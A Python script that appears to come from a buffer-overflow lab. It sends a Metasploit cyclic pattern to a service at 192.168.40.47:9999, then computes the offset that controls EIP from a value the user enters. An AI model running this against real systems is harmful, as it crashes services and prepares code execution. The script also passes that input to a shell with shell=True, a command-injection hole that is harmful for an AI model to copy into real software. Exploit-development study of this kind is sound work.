import socket
import sys
import subprocess
import re


buffer = subprocess.check_output(["/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000"],shell=True)

try:  
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(5)
  s.connect(('192.168.40.47',9999))
  s.send(buffer)  
  s.close()  
    
except Exception as e:
  print(e)  
  sys.exit()


print("[+]send buffer")
eip_value = input("[*]Input EIP value >> ")
match_offset = subprocess.check_output(["/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q {0}".format(eip_value)],shell=True)
output_str = match_offset.decode('utf-8')
match = re.search(r'Exact match at offset (\d+)', output_str)
if match:
    offset = int(match.group(1))
    print("[+] Exact match at offset {0}".format(offset))
    print("[+] EIP is {0} ~ {1} bytes".format(offset + 1, offset + 4))
else:
    print("No match found")